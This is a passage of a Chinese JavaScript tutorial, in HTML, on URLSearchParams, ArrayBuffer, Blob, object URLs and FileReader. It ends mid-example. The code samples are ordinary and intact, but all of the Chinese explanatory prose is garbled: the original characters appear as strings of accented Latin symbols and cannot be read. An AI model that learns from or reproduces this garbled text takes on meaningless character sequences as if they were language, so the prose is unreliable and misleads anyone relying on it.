<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;3&amp;foo&#x3D;2&amp;foo&#x3D;1&#39;);</span><br><span class="line">params.get(&#39;foo&#39;) &#x2F;&#x2F; &quot;3&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸‰ä¸ª<code>foo</code>é”®ï¼Œ<code>get</code>æ–¹æ³•è¿”å›æœ€å‰é¢çš„é”®å€¼<code>3</code>ã€‚</p>
<p><code>getAll()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜æ˜¯æŒ‡å®šé”®çš„æ‰€æœ‰é”®å€¼ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&amp;foo&#x3D;2&#39;);</span><br><span class="line">params.getAll(&#39;foo&#39;) &#x2F;&#x2F; [&quot;1&quot;, &quot;2&quot;]</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸¤ä¸ª<code>foo</code>é”®ï¼Œ<code>getAll</code>è¿”å›çš„æ•°ç»„å°±æœ‰ä¸¤ä¸ªæˆå‘˜ã€‚</p>
<h4 id="URLSearchParams-sort"><a href="#URLSearchParams-sort" class="headerlink" title="URLSearchParams.sort()"></a>URLSearchParams.sort()</h4><p><code>sort()</code>æ–¹æ³•å¯¹æŸ¥è¯¢å­—ç¬¦ä¸²é‡Œé¢çš„é”®è¿›è¡Œæ’åºï¼Œè§„åˆ™æ˜¯æŒ‰ç…§ Unicode ç ç‚¹ä»å°åˆ°å¤§æ’åˆ—ã€‚</p>
<p>è¯¥æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼Œæˆ–è€…è¯´è¿”å›å€¼æ˜¯<code>undefined</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;c&#x3D;4&amp;a&#x3D;2&amp;b&#x3D;3&amp;a&#x3D;1&#39;);</span><br><span class="line">params.sort();</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;a&#x3D;2&amp;a&#x3D;1&amp;b&#x3D;3&amp;c&#x3D;4&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªåŒåçš„é”®<code>a</code>ï¼Œå®ƒä»¬ä¹‹é—´ä¸ä¼šæ’åºï¼Œè€Œæ˜¯ä¿ç•™åŸå§‹çš„é¡ºåºã€‚</p>
<h4 id="URLSearchParams-keys-ï¼ŒURLSearchParams-values-ï¼ŒURLSearchParams-entries"><a href="#URLSearchParams-keys-ï¼ŒURLSearchParams-values-ï¼ŒURLSearchParams-entries" class="headerlink" title="URLSearchParams.keys()ï¼ŒURLSearchParams.values()ï¼ŒURLSearchParams.entries()"></a>URLSearchParams.keys()ï¼ŒURLSearchParams.values()ï¼ŒURLSearchParams.entries()</h4><p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œä¾›<code>for...of</code>å¾ªç¯éå†ã€‚å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼Œ<code>keys</code>æ–¹æ³•è¿”å›çš„æ˜¯é”®åçš„éå†å™¨ï¼Œ<code>values</code>æ–¹æ³•è¿”å›çš„æ˜¯é”®å€¼çš„éå†å™¨ï¼Œ<code>entries</code>è¿”å›çš„æ˜¯é”®å€¼å¯¹çš„éå†å™¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;a&#x3D;1&amp;b&#x3D;2&#39;);</span><br><span class="line"></span><br><span class="line">for(var p of params.keys()) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; a</span><br><span class="line">&#x2F;&#x2F; b</span><br><span class="line"></span><br><span class="line">for(var p of params.values()) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 1</span><br><span class="line">&#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">for(var p of params.entries()) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; [&quot;a&quot;, &quot;1&quot;]</span><br><span class="line">&#x2F;&#x2F; [&quot;b&quot;, &quot;2&quot;]</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›´æ¥å¯¹<code>URLSearchParams</code>è¿›è¡Œéå†ï¼Œå…¶å®å†…éƒ¨è°ƒç”¨çš„å°±æ˜¯<code>entries</code>æ¥å£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var p of params) &#123;&#125;</span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäº</span><br><span class="line">for (var p of params.entries()) &#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ArrayBuffer-å¯¹è±¡ï¼ŒBlob-å¯¹è±¡"><a href="#ArrayBuffer-å¯¹è±¡ï¼ŒBlob-å¯¹è±¡" class="headerlink" title="ArrayBuffer å¯¹è±¡ï¼ŒBlob å¯¹è±¡"></a>ArrayBuffer å¯¹è±¡ï¼ŒBlob å¯¹è±¡</h2><h3 id="ArrayBuffer-å¯¹è±¡"><a href="#ArrayBuffer-å¯¹è±¡" class="headerlink" title="ArrayBuffer å¯¹è±¡"></a>ArrayBuffer å¯¹è±¡</h3><p>ArrayBuffer å¯¹è±¡è¡¨ç¤ºä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ï¼Œç”¨æ¥æ¨¡æ‹Ÿå†…å­˜é‡Œé¢çš„æ•°æ®ã€‚é€šè¿‡è¿™ä¸ªå¯¹è±¡ï¼ŒJavaScript å¯ä»¥è¯»å†™äºŒè¿›åˆ¶æ•°æ®ã€‚è¿™ä¸ªå¯¹è±¡å¯ä»¥çœ‹ä½œå†…å­˜æ•°æ®çš„è¡¨è¾¾ã€‚</p>
<p>è¿™ä¸ªå¯¹è±¡æ˜¯ ES6 æ‰å†™å…¥æ ‡å‡†çš„ï¼Œæ™®é€šçš„ç½‘é¡µç¼–ç¨‹ç”¨ä¸åˆ°å®ƒï¼Œä¸ºäº†æ•™ç¨‹ä½“ç³»çš„å®Œæ•´ï¼Œä¸‹é¢åªæä¾›ä¸€ä¸ªç®€ç•¥çš„ä»‹ç»ï¼Œè¯¦ç»†ä»‹ç»è¯·çœ‹ã€ŠES6 æ ‡å‡†å…¥é—¨ã€‹é‡Œé¢çš„ç« èŠ‚ã€‚</p>
<p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>ArrayBuffer()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆå®ä¾‹ã€‚å®ƒæ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºè¿™æ®µäºŒè¿›åˆ¶æ•°æ®å ç”¨å¤šå°‘ä¸ªå­—èŠ‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var buffer &#x3D; new ArrayBuffer(8);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå®ä¾‹å¯¹è±¡<code>buffer</code>å ç”¨8ä¸ªå­—èŠ‚ã€‚</p>
<p>ArrayBuffer å¯¹è±¡æœ‰å®ä¾‹å±æ€§<code>byteLength</code>ï¼Œè¡¨ç¤ºå½“å‰å®ä¾‹å ç”¨çš„å†…å­˜é•¿åº¦ï¼ˆå•ä½å­—èŠ‚ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var buffer &#x3D; new ArrayBuffer(8);</span><br><span class="line">buffer.byteLength &#x2F;&#x2F; 8</span><br></pre></td></tr></table></figure>

<p>ArrayBuffer å¯¹è±¡æœ‰å®ä¾‹æ–¹æ³•<code>slice()</code>ï¼Œç”¨æ¥å¤åˆ¶ä¸€éƒ¨åˆ†å†…å­˜ã€‚å®ƒæ¥å—ä¸¤ä¸ªæ•´æ•°å‚æ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºå¤åˆ¶çš„å¼€å§‹ä½ç½®ï¼ˆä»0å¼€å§‹ï¼‰å’Œç»“æŸä½ç½®ï¼ˆå¤åˆ¶æ—¶ä¸åŒ…æ‹¬ç»“æŸä½ç½®ï¼‰ï¼Œå¦‚æœçœç•¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œåˆ™è¡¨ç¤ºä¸€ç›´å¤åˆ¶åˆ°ç»“æŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var buf1 &#x3D; new ArrayBuffer(8);</span><br><span class="line">var buf2 &#x3D; buf1.slice(0);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç è¡¨ç¤ºå¤åˆ¶åŸæ¥çš„å®ä¾‹ã€‚</p>
<h3 id="Blob-å¯¹è±¡"><a href="#Blob-å¯¹è±¡" class="headerlink" title="Blob å¯¹è±¡"></a>Blob å¯¹è±¡</h3><h4 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>Blob å¯¹è±¡è¡¨ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„æ•°æ®å†…å®¹ï¼Œæ¯”å¦‚ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶çš„å†…å®¹å°±å¯ä»¥é€šè¿‡ Blob å¯¹è±¡è¯»å†™ã€‚å®ƒé€šå¸¸ç”¨æ¥è¯»å†™æ–‡ä»¶ï¼Œå®ƒçš„åå­—æ˜¯ Binary Large Object ï¼ˆäºŒè¿›åˆ¶å¤§å‹å¯¹è±¡ï¼‰çš„ç¼©å†™ã€‚å®ƒä¸ ArrayBuffer çš„åŒºåˆ«åœ¨äºï¼Œå®ƒç”¨äºæ“ä½œäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œ ArrayBuffer ç”¨äºæ“ä½œå†…å­˜ã€‚</p>
<p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>Blob()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆå®ä¾‹å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Blob(array [, options])</span><br></pre></td></tr></table></figure>

<p><code>Blob</code>æ„é€ å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œæˆå‘˜æ˜¯å­—ç¬¦ä¸²æˆ–äºŒè¿›åˆ¶å¯¹è±¡ï¼Œè¡¨ç¤ºæ–°ç”Ÿæˆçš„<code>Blob</code>å®ä¾‹å¯¹è±¡çš„å†…å®¹ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œæ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç›®å‰åªæœ‰ä¸€ä¸ªå±æ€§<code>type</code>ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ•°æ®çš„ MIME ç±»å‹ï¼Œé»˜è®¤æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var htmlFragment &#x3D; [&#39;&lt;a id&#x3D;&quot;a&quot;&gt;&lt;b id&#x3D;&quot;b&quot;&gt;hey!&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;];</span><br><span class="line">var myBlob &#x3D; new Blob(htmlFragment, &#123;type : &#39;text&#x2F;html&#39;&#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå®ä¾‹å¯¹è±¡<code>myBlob</code>åŒ…å«çš„æ˜¯å­—ç¬¦ä¸²ã€‚ç”Ÿæˆå®ä¾‹çš„æ—¶å€™ï¼Œæ•°æ®ç±»å‹æŒ‡å®šä¸º<code>text/html</code>ã€‚</p>
<p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ï¼ŒBlob ä¿å­˜ JSON æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj &#x3D; &#123; hello: &#39;world&#39; &#125;;</span><br><span class="line">var blob &#x3D; new Blob([ JSON.stringify(obj) ], &#123;type : &#39;application&#x2F;json&#39;&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•" class="headerlink" title="å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•"></a>å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</h4><p><code>Blob</code>å…·æœ‰ä¸¤ä¸ªå®ä¾‹å±æ€§<code>size</code>å’Œ<code>type</code>ï¼Œåˆ†åˆ«è¿”å›æ•°æ®çš„å¤§å°å’Œç±»å‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var htmlFragment &#x3D; [&#39;&lt;a id&#x3D;&quot;a&quot;&gt;&lt;b id&#x3D;&quot;b&quot;&gt;hey!&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;];</span><br><span class="line">var myBlob &#x3D; new Blob(htmlFragment, &#123;type : &#39;text&#x2F;html&#39;&#125;);</span><br><span class="line"></span><br><span class="line">myBlob.size &#x2F;&#x2F; 32</span><br><span class="line">myBlob.type &#x2F;&#x2F; &quot;text&#x2F;html&quot;</span><br></pre></td></tr></table></figure>

<p><code>Blob</code>å…·æœ‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•<code>slice</code>ï¼Œç”¨æ¥æ‹·è´åŸæ¥çš„æ•°æ®ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ª<code>Blob</code>å®ä¾‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myBlob.slice(start, end, contentType)</span><br></pre></td></tr></table></figure>

<p><code>slice</code>æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œéƒ½æ˜¯å¯é€‰çš„ã€‚å®ƒä»¬ä¾æ¬¡æ˜¯èµ·å§‹çš„å­—èŠ‚ä½ç½®ï¼ˆé»˜è®¤ä¸º0ï¼‰ã€ç»“æŸçš„å­—èŠ‚ä½ç½®ï¼ˆé»˜è®¤ä¸º<code>size</code>å±æ€§çš„å€¼ï¼Œè¯¥ä½ç½®æœ¬èº«å°†ä¸åŒ…å«åœ¨æ‹·è´çš„æ•°æ®ä¹‹ä¸­ï¼‰ã€æ–°å®ä¾‹çš„æ•°æ®ç±»å‹ï¼ˆé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ï¼‰ã€‚</p>
<h4 id="è·å–æ–‡ä»¶ä¿¡æ¯"><a href="#è·å–æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–æ–‡ä»¶ä¿¡æ¯"></a>è·å–æ–‡ä»¶ä¿¡æ¯</h4><p>æ–‡ä»¶é€‰æ‹©å™¨<code>&lt;input type=&quot;file&quot;&gt;</code>ç”¨æ¥è®©ç”¨æˆ·é€‰å–æ–‡ä»¶ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨ä¸å…è®¸è„šæœ¬è‡ªè¡Œè®¾ç½®è¿™ä¸ªæ§ä»¶çš„<code>value</code>å±æ€§ï¼Œå³æ–‡ä»¶å¿…é¡»æ˜¯ç”¨æˆ·æ‰‹åŠ¨é€‰å–çš„ï¼Œä¸èƒ½æ˜¯è„šæœ¬æŒ‡å®šçš„ã€‚ä¸€æ—¦ç”¨æˆ·é€‰å¥½äº†æ–‡ä»¶ï¼Œè„šæœ¬å°±å¯ä»¥è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚</p>
<p>æ–‡ä»¶é€‰æ‹©å™¨è¿”å›ä¸€ä¸ª FileList å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„æˆå‘˜ï¼Œæ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ª File å®ä¾‹å¯¹è±¡ã€‚File å®ä¾‹å¯¹è±¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ Blob å®ä¾‹ï¼Œå¢åŠ äº†<code>name</code>å’Œ<code>lastModifiedDate</code>å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; accept&#x3D;&quot;image&#x2F;*&quot; multiple onchange&#x3D;&quot;fileinfo(this.files)&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">function fileinfo(files) &#123;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var f &#x3D; files[i];</span><br><span class="line">    console.log(</span><br><span class="line">      f.name, &#x2F;&#x2F; æ–‡ä»¶åï¼Œä¸å«è·¯å¾„</span><br><span class="line">      f.size, &#x2F;&#x2F; æ–‡ä»¶å¤§å°ï¼ŒBlob å®ä¾‹å±æ€§</span><br><span class="line">      f.type, &#x2F;&#x2F; æ–‡ä»¶ç±»å‹ï¼ŒBlob å®ä¾‹å±æ€§</span><br><span class="line">      f.lastModifiedDate &#x2F;&#x2F; æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†æ–‡ä»¶é€‰æ‹©å™¨ï¼Œæ‹–æ”¾ API çš„<code>dataTransfer.files</code>è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªFileList å¯¹è±¡ï¼Œå®ƒçš„æˆå‘˜å› æ­¤ä¹Ÿæ˜¯ File å®ä¾‹å¯¹è±¡ã€‚</p>
<h4 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h4><p>AJAX è¯·æ±‚æ—¶ï¼Œå¦‚æœæŒ‡å®š<code>responseType</code>å±æ€§ä¸º<code>blob</code>ï¼Œä¸‹è½½ä¸‹æ¥çš„å°±æ˜¯ä¸€ä¸ª Blob å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function getBlob(url, callback) &#123;</span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;GET&#39;, url);</span><br><span class="line">  xhr.responseType &#x3D; &#39;blob&#39;;</span><br><span class="line">  xhr.onload &#x3D; function () &#123;</span><br><span class="line">    callback(xhr.response);</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send(null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>xhr.response</code>æ‹¿åˆ°çš„å°±æ˜¯ä¸€ä¸ª Blob å¯¹è±¡ã€‚</p>
<h4 id="ç”Ÿæˆ-URL"><a href="#ç”Ÿæˆ-URL" class="headerlink" title="ç”Ÿæˆ URL"></a>ç”Ÿæˆ URL</h4><p>æµè§ˆå™¨å…è®¸ä½¿ç”¨<code>URL.createObjectURL()</code>æ–¹æ³•ï¼Œé’ˆå¯¹ Blob å¯¹è±¡ç”Ÿæˆä¸€ä¸ªä¸´æ—¶ URLï¼Œä»¥ä¾¿äºæŸäº› API ä½¿ç”¨ã€‚è¿™ä¸ª URL ä»¥<code>blob://</code>å¼€å¤´ï¼Œè¡¨æ˜å¯¹åº”ä¸€ä¸ª Blob å¯¹è±¡ï¼Œåè®®å¤´åé¢æ˜¯ä¸€ä¸ªè¯†åˆ«ç¬¦ï¼Œç”¨æ¥å”¯ä¸€å¯¹åº”å†…å­˜é‡Œé¢çš„ Blob å¯¹è±¡ã€‚è¿™ä¸€ç‚¹ä¸<code>data://URL</code>ï¼ˆURL åŒ…å«å®é™…æ•°æ®ï¼‰å’Œ<code>file://URL</code>ï¼ˆæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿé‡Œé¢çš„æ–‡ä»¶ï¼‰éƒ½ä¸ä¸€æ ·ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var droptarget &#x3D; document.getElementById(&#39;droptarget&#39;);</span><br><span class="line"></span><br><span class="line">droptarget.ondrop &#x3D; function (e) &#123;</span><br><span class="line">  var files &#x3D; e.dataTransfer.files;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var type &#x3D; files[i].type;</span><br><span class="line">    if (type.substring(0,6) !&#x3D;&#x3D; &#39;image&#x2F;&#39;)</span><br><span class="line">      continue;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; URL.createObjectURL(files[i]);</span><br><span class="line">    img.onload &#x3D; function () &#123;</span><br><span class="line">      this.width &#x3D; 100;</span><br><span class="line">      document.body.appendChild(this);</span><br><span class="line">      URL.revokeObjectURL(this.src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç é€šè¿‡ä¸ºæ‹–æ”¾çš„å›¾ç‰‡æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª URLï¼Œäº§ç”Ÿå®ƒä»¬çš„ç¼©ç•¥å›¾ï¼Œä»è€Œä½¿å¾—ç”¨æˆ·å¯ä»¥é¢„è§ˆé€‰æ‹©çš„æ–‡ä»¶ã€‚</p>
<p>æµè§ˆå™¨å¤„ç† Blob URL å°±è·Ÿæ™®é€šçš„ URL ä¸€æ ·ï¼Œå¦‚æœ Blob å¯¹è±¡ä¸å­˜åœ¨ï¼Œè¿”å›404çŠ¶æ€ç ï¼›å¦‚æœè·¨åŸŸè¯·æ±‚ï¼Œè¿”å›403çŠ¶æ€ç ã€‚Blob URL åªå¯¹ GET è¯·æ±‚æœ‰æ•ˆï¼Œå¦‚æœè¯·æ±‚æˆåŠŸï¼Œè¿”å›200çŠ¶æ€ç ã€‚ç”±äº Blob URL å°±æ˜¯æ™®é€š URLï¼Œå› æ­¤å¯ä»¥ä¸‹è½½ã€‚</p>
<h4 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h4><p>å–å¾— Blob å¯¹è±¡ä»¥åï¼Œå¯ä»¥é€šè¿‡<code>FileReader</code>å¯¹è±¡ï¼Œè¯»å– Blob å¯¹è±¡çš„å†…å®¹ï¼Œå³æ–‡ä»¶å†…å®¹ã€‚</p>
<p>FileReader å¯¹è±¡æä¾›å››ä¸ªæ–¹æ³•ï¼Œå¤„ç† Blob å¯¹è±¡ã€‚Blob å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ å…¥è¿™äº›æ–¹æ³•ï¼Œç„¶åä»¥æŒ‡å®šçš„æ ¼å¼è¿”å›ã€‚</p>
<ul>
<li><code>FileReader.readAsText()</code>ï¼šè¿”å›æ–‡æœ¬ï¼Œéœ€è¦æŒ‡å®šæ–‡æœ¬ç¼–ç ï¼Œé»˜è®¤ä¸º UTF-8ã€‚</li>
<li><code>FileReader.readAsArrayBuffer()</code>ï¼šè¿”å› ArrayBuffer å¯¹è±¡ã€‚</li>
<li><code>FileReader.readAsDataURL()</code>ï¼šè¿”å› Data URLã€‚</li>
<li><code>FileReader.readAsBinaryString()</code>ï¼šè¿”å›åŸå§‹çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯<code>FileReader.readAsText()</code>æ–¹æ³•çš„ä¾‹å­ï¼Œç”¨æ¥è¯»å–æ–‡æœ¬æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;readfile(this.files[0])&quot;&gt;&lt;&#x2F;input&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;pre id&#x3D;&quot;output&quot;&gt;&lt;&#x2F;pre&gt;</span><br><span class="line">function readfile(f) &#123;</span><br><span class="line">  var reader &#x3D; new FileReader();</span><br><span class="line">  reader.readAsText(f);</span><br><span class="line">  reader.onload &#x3D; function () &#123;</span><br><span class="line">    var text &#x3D; reader.result;</span><br><span class="line">    var out &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">    out.innerHTML &#x3D; &#39;&#39;;</span><br><span class="line">    out.appendChild(document.createTextNode(text));</span><br><span class="line">  &#125;</span><br><span class="line">  reader.onerror &#x3D; function(e) &#123;</span><br><span class="line">    console.log(&#39;Error&#39;, e);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œé€šè¿‡æŒ‡å®š FileReader å®ä¾‹å¯¹è±¡çš„<code>onload</code>ç›‘å¬å‡½æ•°ï¼Œåœ¨å®ä¾‹çš„<code>result</code>å±æ€§ä¸Šæ‹¿åˆ°æ–‡ä»¶å†…å®¹ã€‚</p>
<p>ä¸‹é¢æ˜¯<code>FileReader.readAsArrayBuffer()</code>æ–¹æ³•çš„ä¾‹å­ï¼Œç”¨äºè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;input 